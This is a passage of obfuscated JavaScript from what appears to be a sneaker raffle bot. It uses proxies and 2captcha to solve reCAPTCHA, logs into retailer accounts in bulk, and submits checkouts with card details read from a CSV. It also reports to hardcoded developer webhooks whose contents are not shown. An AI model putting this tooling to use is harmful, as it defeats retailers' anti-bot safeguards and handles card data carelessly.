                            _0x1d50a9 == 'yes' && _0x4b24ee >= 0x5 && (_0xc1caad(_0x46f925[_0x11970c], _0x5d50e7), _0x1d50a9 = 'no', _0x4b24ee = 0x0), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x134fdb, _0x26d3cc, _0x34959a) {
                    _0x25d1cc['use'](_0x543a6c()), _0x25d1cc['use'](_0x49aced({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8702f0['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5300d7 = 0x0; _0x5300d7 < _0x26d3cc['length']; _0x5300d7++) {
                        var _0x2dd313;
                        if (_0x37cf15 != 'yes')
                            var _0x37cf15 = '', _0x36daa3 = 0x0;
                        _0x16d703(_0x134fdb['name'] + '\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20/\x20' + _0x26d3cc['length'] + '\x20||\x20File:\x20' + _0x78687a + '\x20Proxies:\x20' + _0x1d42f7), await _0x6f470f(_0x26d3cc, _0x5300d7);
                        if (_0x26d3cc[_0x5300d7]['Email'] == '' || _0x26d3cc[_0x5300d7]['Password'] == '' || _0x26d3cc[_0x5300d7]['FirstName'] == '' || _0x26d3cc[_0x5300d7]['LastName'] == '') {
                            console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x8702f0['useRandomProxy'] = ![])
                            var _0x31530c = _0x34959a[_0x5300d7]['split'](':');
                        else
                            var _0x15509d = Math['round'](Math['random']() * (_0x34959a['length'] - 0x1)), _0x31530c = _0x34959a[_0x15509d]['split'](':');
                        const _0xa8faf9 = await _0x25d1cc['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31530c[0x0] + ':' + _0x31530c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x1b014d = await _0xa8faf9['newPage']();
                            await _0x1b014d['authenticate']({
                                'username': '' + _0x31530c[0x2],
                                'password': '' + _0x31530c[0x3]
                            }), await _0x1b014d['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b014d['setRequestInterception'](!![]), _0x1b014d['on']('request', _0x15f85e => {
                                _0x15f85e['resourceType']() === 'image' || _0x15f85e['resourceType']() === 'font' || _0x15f85e['resourceType']() === 'media' ? _0x15f85e['abort']() : _0x15f85e['continue']();
                            }), await _0x1b014d['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1b014d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1b014d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x7e80ad(0x258), await _0x1b014d['waitForSelector']('#CustomerEmail'), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1b014d['type']('#CustomerEmail', '' + _0x26d3cc[_0x5300d7]['Email']), await _0x7e80ad(0x12c), await _0x1b014d['type']('#CustomerPassword', '' + _0x26d3cc[_0x5300d7]['Password']), await _0x7e80ad(0x226), await _0x1b014d['$eval']('#customer_login', _0x4113e8 => _0x4113e8['submit']()), await _0x7e80ad(0x7d0), await _0x1b014d['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20' + _0x1a235e['cyan']('Solving\x20Captcha')), await _0x1b014d['solveRecaptchas'](), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1b014d['$eval']('.shopify-challenge__container\x20>\x20form', _0x3650ba => _0x3650ba['submit']());
                            try {
                                await _0x1b014d['waitForSelector']('.nav-account'), await _0x7e80ad(0x4b0);
                            } catch {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1b014d['goto']('' + _0x26d3cc[_0x5300d7]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x7e80ad(0xbb8), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1b014d['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1b014d['click']('.product-select-variant-wrapper'), await _0x7e80ad(0x320), await _0x1b014d['click']('li.product-select-variant__value[data-size=\x22' + _0x26d3cc[_0x5300d7]['Size'] + '\x22]'), await _0x7e80ad(0x384), await _0x1b014d['$eval']('#AddToCartForm-product-template-raffle', _0x3d5127 => _0x3d5127['submit']()), await _0x1b014d['waitForSelector']('.cart-order-summary__content'), await _0x7e80ad(0x514), await _0x1b014d['goto']('https://drop.slamjam.com/checkout'), await _0x7e80ad(0x514), await _0x1b014d['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1b014d['select']('#checkout_shipping_address_country', '' + _0x26d3cc[_0x5300d7]['Country']), await _0x7e80ad(0x200), await _0x1b014d['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1b014d['type']('#checkout_shipping_address_first_name', '' + _0x26d3cc[_0x5300d7]['FirstName']), await _0x7e80ad(0x237), await _0x1b014d['type']('#checkout_shipping_address_last_name', '' + _0x26d3cc[_0x5300d7]['LastName']), await _0x7e80ad(0x1e0), await _0x1b014d['type']('#checkout_shipping_address_address1', _0x26d3cc[_0x5300d7]['Address1'] + '\x20' + _0x26d3cc[_0x5300d7]['HouseNumber']), await _0x7e80ad(0x514), await _0x1b014d['type']('#checkout_shipping_address_address2', '' + _0x26d3cc[_0x5300d7]['Address2']), await _0x7e80ad(0x514);
                            _0x26d3cc[_0x5300d7]['Postcode'] == undefined && (_0x26d3cc[_0x5300d7]['Postcode'] = _0x26d3cc[_0x5300d7]['Zip']);
                            await _0x1b014d['type']('#checkout_shipping_address_zip', '' + _0x26d3cc[_0x5300d7]['Postcode']), await _0x7e80ad(0x2bc), await _0x1b014d['type']('#checkout_shipping_address_city', '' + _0x26d3cc[_0x5300d7]['City']), await _0x7e80ad(0x320), await _0x1b014d['type']('#checkout_shipping_address_phone', '' + _0x26d3cc[_0x5300d7]['Phone']), await _0x7e80ad(0x320), await _0x1b014d['click']('#continue_button'), await _0x7e80ad(0xbb8), await _0x1b014d['waitForSelector']('.summary-title'), await _0x7e80ad(0x320), await _0x1b014d['click']('#continue_button'), await _0x7e80ad(0x320), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1b014d['waitForSelector']('#checkout_credit_card_vault'), await _0x7e80ad(0x3e8);
                            var _0x57dc2a = await _0x1b014d['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x4442c7 = await _0x57dc2a['contentFrame']();
                            await _0x4442c7['click']('#number'), await _0x7e80ad(0x3e8), await _0x4442c7['type']('#number', '' + _0x26d3cc[_0x5300d7]['CardNumber'], { 'delay': 0x78 }), _0x57dc2a = await _0x1b014d['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x4442c7 = await _0x57dc2a['contentFrame'](), await _0x7e80ad(0x1c2), await _0x4442c7['click']('#name'), await _0x7e80ad(0x1f4), await _0x4442c7['type']('#name', '' + _0x26d3cc[_0x5300d7]['NameOnCard'], { 'delay': 0x78 }), _0x57dc2a = await _0x1b014d['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x4442c7 = await _0x57dc2a['contentFrame'](), await _0x7e80ad(0x1c2), await _0x4442c7['click']('#expiry'), await _0x7e80ad(0x1f4), await _0x4442c7['type']('#expiry', '' + _0x26d3cc[_0x5300d7]['ExpiryDate'], { 'delay': 0x78 }), _0x57dc2a = await _0x1b014d['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x4442c7 = await _0x57dc2a['contentFrame'](), await _0x7e80ad(0x1c2), await _0x4442c7['click']('#verification_value'), await _0x7e80ad(0x1f4), await _0x4442c7['type']('#verification_value', '' + _0x26d3cc[_0x5300d7]['CVV'], { 'delay': 0x78 }), await _0x1b014d['$eval']('#accepts-flag-raffle', _0x3805cc => _0x3805cc['click']()), await _0x7e80ad(0x7d0), console['log'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1b014d['$eval']('#continue_button', _0x583f68 => _0x583f68['click']()), await _0x7e80ad(0x1b58), await _0x1b014d['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1b014d['$eval']('.edit_checkout.animate-floating-labels', _0x19dff3 => _0x19dff3['submit']()), await _0x7e80ad(0x7d0);
                            try {
                                await _0x1b014d['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x37cf15 = 'no', _0x4bdc1f(_0x26d3cc[_0x5300d7], _0x134fdb), console['log'](_0x1a235e['green'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x339db9) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x339db9['message']);
                            }
                            var _0x276a0e = await _0x296449(_0x26d3cc[_0x5300d7], _0x134fdb, 'dev', ![]), _0x3aa822 = await _0x296449(_0x26d3cc[_0x5300d7], _0x134fdb, 'pub', ![]);
                            const _0x70041f = {
                                'succesDEVMSG': { 'embeds': [_0x276a0e] },
                                'succesPUBMSG': { 'embeds': [_0x3aa822] }
                            };
                            try {
                                _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], _0x70041f['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x2ae18c, _0x70041f['succesDEVMSG']), await _0x7e80ad(0xc8), await _0x10a0d6(_0x355433, _0x70041f['succesPUBMSG']);
                            } catch (_0x408bd8) {
                                console['log'](_0x1a235e['yellow'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x408bd8));
                            }
                        } catch (_0x4a9602) {
                            console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x48b703[taskModule]['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20' + _0x4a9602)), _0x2dd313 = '' + _0x4a9602;
                            var _0x4a3d2e = await _0x296449(kickz[_0x5300d7], _0x134fdb, 'dev', !![], _0x2dd313);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x4a3d2e] }, _0x8702f0['webhook'] != undefined && _0x8702f0['webhook'] != '' && await _0x10a0d6(_0x8702f0['webhook'], EMBEDS['errorDEV']), await _0x10a0d6(_0x5cf6ec, EMBEDS['errorDEV']), _0x37cf15 = 'yes';
                        } finally {
                            _0xa8faf9 && _0xa8faf9['close']();
                            if (_0x37cf15 == 'yes' && _0x36daa3 != 0x5 && _0x2dd313 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1a235e['red'](_0x441ea7() + '\x20[' + _0x134fdb['name'] + ']\x20Task\x20' + (_0x5300d7 + 0x1) + '\x20:\x20Retrying')), _0x5300d7 = _0x5300d7 - 0x1, _0x36daa3 = _0x36daa3 + 0x1;
                                continue;
                            }
                            _0x37cf15 == 'yes' && _0x36daa3 >= 0x5 && (_0xc1caad(_0x26d3cc[_0x5300d7], _0x134fdb), _0x37cf15 = 'no', _0x36daa3 = 0x0), console['log']('Waiting\x20for\x20' + _0x8702f0['delay'] + '\x20ms'), await _0x7e80ad(_0x8702f0['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x189994) {
                    var _0x335a2a = await _0x8560e2(), _0x1d566f = _0x40e0db['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3e0e00 = _0x2bdf95['parse'](_0x1d566f, { 'header': !![] })['data'];
                    for (var _0x2d306e = 0x0; _0x2d306e < _0x3e0e00['length']; _0x2d306e++) {
                        var _0x3467cd = _0x3e0e00[_0x2d306e]['Store'], _0x1e0251 = _0x3e0e00[_0x2d306e]['Mode'];
                        for (var _0x3221fa of _0x48b703) {
                            const _0x4c91b9 = _0x3221fa['name']['includes'](_0x3467cd);
                            if (!_0x4c91b9)
                                continue;
                            for (mode of _0x3221fa['modules']) {
                                if (mode['name'] == _0x1e0251) {
                                    console['log']('Running\x20' + _0x1a235e['cyan'](mode['name'])), await mode['function'](mode, [_0x3e0e00[_0x2d306e]], _0x335a2a);
                                    var _0x4f7a4a = _0x1d566f['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x40e0db['writeFileSync']('../failed-tasks.csv', _0x4f7a4a);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x57b543 = await _0x20a3b0['get']('Answer');
                    if (_0x57b543['Answer']['toLowerCase']() == 'y') {
                        _0x40e0db['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x7e80ad(0x3e8);
                        return;
                    }
                    if (_0x57b543['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x7e80ad(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x7e80ad(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x9634de(_0x5efee6) {
    var _0x44184a = await _0x8560e2(), _0x46d719 = _0x40e0db['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3c6b81 = _0x2bdf95['parse'](_0x46d719, { 'header': !![] })['data'];
    for (var _0x34b4b4 = 0x0; _0x34b4b4 < _0x3c6b81['length']; _0x34b4b4++) {
        var _0x1faaaa = _0x3c6b81[_0x34b4b4]['Store'], _0x33a61a = _0x3c6b81[_0x34b4b4]['Mode'];
        for (var _0x459418 of _0x48b703) {
            const _0x361880 = _0x459418['name']['includes'](_0x1faaaa);
            if (_0x361880)
                for (mode of _0x48b703[_0x459418]['modules']) {
                    const _0x50922e = mode['name']['includes'](_0x33a61a);
                    _0x50922e && (_0x5efee6 = mode['name'], await mode['function'](_0x5efee6, _0x3c6b81[_0x34b4b4], _0x44184a));
                }
        }
    }
}
async function _0x21940f() {
    await _0x24032f(), console['clear']();
    if (_0x4a89e9 != 'devkey') {
        let _0x2751f = await _0x557057['autoUpdate']();
        if (_0x2751f === 'yes')
            return _0x1cb199('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x27ab59 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x7e80ad(0x2710);
        ;
    }
    await _0x11d6c3(_0x27ab59);
    if (_0x259562 === ![])
        return console['log']('Closing\x20Browser'), await _0x7e80ad(0xbb8);
    else
        try {
            var _0x4ca94f = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x397af7
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x4a89e9
                    }
                ]
            }];
            const _0x5ac055 = { 'embeds': _0x4ca94f };
            var _0x3fb80b = await _0x296449(null, null, 'open', ![]);
            const _0xe16d46 = { 'openDEVMSG': { 'embeds': [_0x3fb80b] } };
            await _0x10a0d6(_0x52dfba, _0xe16d46['openDEVMSG']);
            async function _0x1c3dd4() {
                _0x16d703('JRaffles\x20' + _0x4a89e9), console['clear'](), console['log']('Welcome\x20to\x20' + _0x1a235e['cyan']('JRaffles();') + '\x20' + _0x4a89e9), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x315ca4 = 0x0; _0x315ca4 < _0x48b703['length'] - 0x4; _0x315ca4++) {
                    if (_0x315ca4 >= 0xa) {
                        console['log']('\x20(' + _0x315ca4 + ')\x20[' + _0x48b703[_0x315ca4]['name'] + ']');
                        continue;
                    }
                    if (_0x48b703[_0x315ca4]['name'] === 'Reload\x20Settings' || _0x48b703[_0x315ca4]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x315ca4 + ')\x20\x20[' + _0x48b703[_0x315ca4]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x48b703['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x48b703['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x48b703['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x48b703['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x85a4e8();
                if (taskModule > _0x48b703['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x7e80ad(0x3e8), _0x1c3dd4();
                if (_0x48b703[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                    var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x3ccdeb = await _0x8560e2(), _0x52faae = await _0x4b59aa();
                        _0x8702f0['shuffleTasks'] && await _0x14af15(_0x52faae), await _0x52af45['function'](_0x52af45, _0x52faae, _0x3ccdeb);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x3ccdeb = await _0x8560e2(), _0x52faae = await _0x4b59aa();
                            _0x8702f0['shuffleTasks'] && await _0x14af15(_0x52faae), await _0x52af45['function'](_0x52af45, _0x52faae, _0x3ccdeb);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x3ccdeb = await _0x8560e2();
                                await _0x52af45['function'](_0x52af45, _0x3ccdeb);
                            }
                        }
                    }
                    return _0x1c3dd4();
                }
                if (_0x48b703[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                        var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x3ccdeb = await _0x8560e2(), _0x52561f = await _0x4b59aa();
                            _0x8702f0['shuffleTasks'] && await _0x14af15(_0x52561f), await _0x52af45['function'](_0x52af45, _0x52561f, _0x3ccdeb);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x3ccdeb = await _0x8560e2(), _0x52561f = await _0x4b59aa();
                                _0x8702f0['shuffleTasks'] && await _0x14af15(_0x52561f), await _0x52af45['function'](_0x52af45, _0x52561f, _0x3ccdeb);
                            }
                        }
                    } catch (_0xab6285) {
                        console['log'](_0xab6285), await _0x7e80ad(0xfa0);
                    }
                    return _0x1c3dd4();
                }
                if (_0x48b703[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                    var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x3ccdeb = await _0x8560e2();
                        return await _0x52af45['function'](_0x52af45, _0x3ccdeb), _0x1c3dd4();
                    }
                    var _0x3ccdeb = await _0x8560e2(), _0x127e0d = await _0x4b59aa();
                    return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x127e0d), await _0x52af45['function'](_0x52af45, _0x127e0d, _0x3ccdeb), _0x1c3dd4();
                }
                if (_0x48b703[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                    var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x3ccdeb = await _0x8560e2(), _0x127e0d = await _0x4b59aa();
                    return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x127e0d), await _0x52af45['function'](_0x52af45, _0x127e0d, _0x3ccdeb), _0x1c3dd4();
                }
                if (_0x48b703[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                    var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x3ccdeb = await _0x8560e2(), _0x127e0d = await _0x4b59aa();
                    return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x127e0d), await _0x52af45['function'](_0x52af45, _0x127e0d, _0x3ccdeb), _0x1c3dd4();
                } else {
                    if (_0x48b703[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                        var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x3ccdeb = await _0x8560e2(), _0x143a55 = await _0x4b59aa();
                            return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x143a55), await _0x52af45['function'](_0x52af45, _0x143a55, _0x3ccdeb), _0x1c3dd4();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x3ccdeb = await _0x8560e2();
                                return await _0x52af45['function'](_0x52af45, null, _0x3ccdeb), _0x1c3dd4();
                            }
                        }
                        ;
                    } else {
                        if (_0x48b703[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                            var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction], _0x3ccdeb = await _0x8560e2(), _0x4c2188 = await _0x4b59aa();
                            return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x4c2188), await _0x52af45['function'](_0x52af45, _0x4c2188, _0x3ccdeb), await _0x7e80ad(0x1388), _0x1c3dd4();
                        } else {
                            if (_0x48b703[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x3ccdeb = await _0x8560e2(), _0x143a55 = await _0x4b59aa();
                                    return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x143a55), await _0x52af45['function'](_0x52af45, _0x143a55, _0x3ccdeb), _0x1c3dd4();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x3ccdeb = await _0x8560e2();
                                        return await _0x52af45['function'](_0x52af45, null, _0x3ccdeb), _0x1c3dd4();
                                    }
                                }
                                ;
                            } else {
                                if (_0x48b703[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                    var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x32d40e('https://bouncewear.com/nl/account/register', _0x52af45);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x48b703[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                        var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x3ccdeb = await _0x8560e2(), _0x15c742 = await _0x4b59aa();
                                            return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x15c742), await _0x52af45['function'](_0x52af45, _0x15c742, _0x3ccdeb), _0x1c3dd4();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x3ccdeb = await _0x8560e2(), _0x15c742 = await _0x4b59aa();
                                                return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x15c742), await _0x52af45['function'](_0x52af45, _0x15c742, _0x3ccdeb), _0x1c3dd4();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x48b703[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                            var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x3ccdeb = await _0x8560e2(), _0x2872b8 = await _0x4b59aa();
                                                return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x2872b8), await _0x52af45['function'](_0x52af45, _0x2872b8, _0x3ccdeb), _0x1c3dd4();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x3ccdeb = await _0x8560e2(), _0x2872b8 = await _0x4b59aa();
                                                    return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x2872b8), await _0x52af45['function'](_0x52af45, _0x2872b8, _0x3ccdeb), _0x1c3dd4();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x48b703[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                                var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x3ccdeb = await _0x8560e2(), _0x106d06 = await _0x4b59aa();
                                                    return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x106d06), await _0x52af45['function'](_0x52af45, _0x106d06, _0x3ccdeb), _0x1c3dd4();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x3ccdeb = await _0x8560e2(), _0x106d06 = await _0x4b59aa();
                                                        return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x106d06), await _0x52af45['function'](_0x52af45, _0x106d06, _0x3ccdeb), _0x1c3dd4();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x48b703[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                                    var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x3ccdeb = await _0x8560e2(), _0x7794b5 = await _0x4b59aa();
                                                        return _0x8702f0['shuffleTasks'] && await _0x14af15(_0x7794b5), await _0x52af45['function'](_0x52af45, _0x7794b5, _0x3ccdeb), _0x1c3dd4();
                                                    }
                                                } else {
                                                    if (_0x48b703[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x7e80ad(0x3e8), _0x1c3dd4();
                                                    else {
                                                        if (_0x48b703[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x3248f7 = _0x48b703[taskModule]['name'], _0x3ccdeb = await _0x8560e2();
                                                            return await _0x302432(_0x3248f7, _0x3ccdeb), _0x1c3dd4();
                                                        } else {
                                                            if (_0x48b703[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x2206d4(_0x48b703[taskModule]['modules']);
                                                                var _0x52af45 = _0x48b703[taskModule]['modules'][taskFunction];
                                                                return await _0x52af45['function'](_0x52af45), _0x1c3dd4();
                                                            } else {
                                                                if (_0x48b703[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x257b21 = 0x0;
                                                                    for (const _0x57838a in _0x8702f0) {
                                                                        console['log']('(' + _0x257b21 + ')\x20' + _0x57838a + '\x20:\x20' + _0x8702f0[_0x57838a]), _0x257b21++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x257b21 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x2d6967 = await _0x15b829();
                                                                    if (_0x2d6967 == _0x257b21)
                                                                        return _0x1c3dd4();
                                                                    console['clear'];
                                                                    var _0xe0b0f2 = 0x0;
                                                                    for (var _0x5b76e0 in _0x8702f0) {
                                                                        if (_0x2d6967 == _0xe0b0f2) {
